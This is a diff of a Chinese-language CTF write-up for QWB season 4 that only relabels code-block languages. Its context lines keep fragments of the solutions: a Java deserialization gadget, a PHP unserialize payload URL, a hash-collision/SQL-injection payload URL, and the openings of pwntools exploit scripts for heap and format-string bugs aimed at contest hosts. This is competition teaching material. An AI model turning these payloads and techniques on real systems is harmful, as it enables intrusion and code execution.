@@ -15,7 +15,7 @@ slug: "qwb-s4-su-wu"
 
 ###	easy_java
 绕一下过滤就行
-```
+```java
 package ysoserial.payloads;
 
 import org.apache.commons.collections.Transformer;
@@ -73,7 +73,7 @@ public class Test {
 
 ###	dice2cry
 http://106.14.66.189/abi.php.bak 得到源码
-```
+```php
 <?php
 session_start();
 header("Content-type:text/html;charset=utf-8");
@@ -154,7 +154,7 @@ for diff in range(-500, 500):
 ###	half_infiltration
 http://39.98.131.124/
 
-```
+```text
 view-source:http://39.98.131.124/?x=a:2:{i:0;O:4:%22User%22:3:{s:3:%22age%22;O:4:%22Pass%22:0:{}s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:6:%22result%22;}i:1;O:4:%22User%22:3:{s:3:%22age%22;O:4:%22Pass%22:0:{}s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:4:%22this%22;}}
 ```
 通过`$this`让 php 产生 fatal error 打破 `obstart` 得到源码
@@ -257,7 +257,7 @@ file_get_contents("http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_yo
 先逆向过pow,前三个字节直接爆破出来QWQ。之后下断看到是断在了read 0x21的地方。
 随便输点东西，跟着后面调试外加看ida的反编译加看官方文档大体可以看出来是将输入的东西分为4组，每组8字节，分别跟一些固定的数字xor，随后cmp对比。
 逆向下来是这样的字符串
-```python=
+```python
 'G00DR3VR'+'W31LD0N3'+'Try2Pwn!'+'GOGOGOGO'
 ```
 之后会再进入一个read流程，下断可以看出来是read 0 stack 0x800。stack为程序虚拟的栈空间。
@@ -268,7 +268,7 @@ file_get_contents("http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_yo
 人肉识别下来是有了syscall的所有调用//0x8 0x9 0xa
 以及能控制所有的syscall所需要的参数。//a1[0] a1[1] a1[2] a1[3]
 之后用程序自带的orw功能去搞就行。
-```python=
+```python
 from pwn import *
 flag=chr(0x51)+chr(0x57)+chr(0x51)
 i=0
@@ -304,7 +304,7 @@ r.interactive()
 但没有leak函数。打stdout因为没有任何跟io有关的操作也实现不了。
 在readdir那边的操作时候，可以先readdir完随后通过修改size分配unsorted bin去写入libc地址，然后给下一个将被readdir给读取出来的字符串连起来。
 最后一发入魂。
-```python=
+```python
 from pwn import*
 
 def menu(ch):
@@ -362,7 +362,7 @@ r.interactive()
 
 ### easypwn
 首先一个off by null 可以构造一个堆块重叠,然后爆破半个字节并利用unsorted bin attack 攻击 global_max_fast,之后则是一个 free对应大小的块 越界后覆盖stdout的read_end 和 write_ptr指针,并令覆盖的内容相同 即可 leak libc_base,之后则是一个攻击 malloc_hook写入rce的ez操作
-```python=
+```python
 from pwn import*
 #context.log_level ='DEBUG'
 def menu(ch):
@@ -452,7 +452,7 @@ p.interactive()
 
 ### oldschool
 审计一下给的源文件即可知道,在mmap_edit中因为 < 和 > 符号搞错了,导致越界,往一个地址写入一个64位长的整型变量,此时只需要leak libc,然后计算出此偏移,因为mmap_edit时的指针类型为int类型,所以 需要之前 offset>>2 才是正确的offset,之后就是往free_hook写入一个system,free('/bin/sh')即可getshell
-```python=
+```python
 from pwn import*
 context.log_level ='DEBUG'
 def menu(ch):
@@ -575,7 +575,7 @@ img.show()
 stegbreak，密码power123
 
 JPHS提取得到
-```
+```text
 https://pan.baidu.com/s/1o43y4UGkm1eP-RViC25aOw
 mrpt
 
@@ -605,7 +605,7 @@ flag{level1_begin_and_level2_is_comelevel3_start_itlevel4_here_alllevel5_is_aaal
 
 ELF逆向，里面全是混淆，使用pin改了一个插件出来，可以用来统计运行过的指令地址，编写idapython，将未运行的指令patch成nop，可以看到程序多了很多函数，大概流程就是：输入，判断长度28，然后进入到一个解方程的地方，解方程即可
 
-```
+```python
 # -*- coding: UTF-8 -*-
 from z3 import *
 s = Solver()
@@ -659,7 +659,7 @@ if s.check() == sat:
 
 ### imitation_game
 fork后子进程是一个CBC AES，正确后，父进程启动了一个chip8程序，这里的字节码进行过更改，打log后，分析，是一个
-```
+```text
 v0
 +2
 
@@ -701,7 +701,7 @@ v9
 2 1 1 
 1 2 2
 系输如上，三组循环，解方程即可
-```
+```python
 # -*- coding: UTF-8 -*-
 from z3 import *
 s = Solver()
@@ -1297,14 +1297,14 @@ flag{te11_me_y0u_like_it}
 
 web题 http://39.101.177.96/
 payload
-```
+```text
 http://39.101.177.96/?hash1=0e251288019&hash2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&hash3=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&hash4=ffifdyop
 ```
 
 ### web辅助
 http://eci-2ze9cia09xafqb8rd109.cloudeci1.ichunqiu.com/  
 签到题，看脚本吧，没什么难度
-```
+```php
 <?php
 class topsolo{
     protected $name;
@@ -1428,7 +1428,7 @@ var_dump($dump);
 ###	侧防
 rev
 xor key后有个换位操作，做对应逆运算即可
-```
+```python
   a = 'QWBlogs'
 b = [0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49,
   0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E,
@@ -1480,7 +1480,7 @@ print("flag{" + sha1(long_to_bytes(min(p,q))).hexdigest() + "}")
 ```
 ### babymessage
 可以覆盖ebp，因为没开pie，所以直接栈迁移到bss上导致了第二次调用时候会栈溢出。
-```python=
+```python
 from pwn import *
 #r=process('./babymessage')
 r=remote('123.56.170.202',21342)
@@ -1607,7 +1607,7 @@ flag提交一直不对，改一下格式即可：QWB{3e752bf509ddb4e9a42f1ef30be
 
 ### Siri - 强网先锋
 一个简单的格式化字符串,leak了stack地址之后就是对上面的地址进行一个返回地址和保存的rbp进行一个修改,通过抬栈 执行 one_gadget
-```python=
+```python
 from pwn import*
 p = process('./main')
 p = remote('123.56.170.202',12124)
@@ -1654,7 +1654,7 @@ p.interactive()
 
 ### Just a Galgame - 强网先锋
 如果top_chunk的size 不够申请的大小,就会另外开辟一个top_chunk,将原先top_chunk扔进unsorted bin,切割后拿到libc_base,在case 5有个read(0,0x4040A0,8);往栈上写一个地址,然乎case 2没有对 index 索引进行一个 检测 越界修改这个地址里面的内容,即可将malloc_hook写为rce
-```python=
+```python
 from pwn import*
 context.log_level ='DEBUG'
 def menu(ch):
@@ -1691,7 +1691,7 @@ p.interactive()
 ```
 ### babynotes - 强网先锋
 因为在regset中 strcpy 可以导致堆溢出修改下一个块的size,则可构造 chunk overlap,然后往malloc_hook中写入rce
-```python=
+```python
 from pwn import*
 #context.log_level ='DEBUG'
 def menu(ch):
